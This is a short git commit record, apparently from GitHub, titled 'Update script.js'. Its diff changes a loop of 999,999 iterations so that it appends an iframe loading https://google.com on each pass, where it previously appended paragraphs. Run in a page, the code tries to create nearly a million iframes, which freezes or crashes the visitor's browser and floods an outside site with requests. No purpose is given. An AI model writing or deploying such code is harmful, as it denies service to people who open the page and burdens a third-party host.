5c564d3ff7662c271807db6781215174696dc539
Rednexie <126991413+Rednexie@users.noreply.github.com>
2024-01-30 16:48:31 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 for (let i = 0; i < 999999; i++){
-  let p = document.createElement('p');
-  p.innerText = window.location.hostname;
+  let p = document.createElement('iframe');
+  p.src = 'https://google.com'
   document.body.appendChild(p);
 }
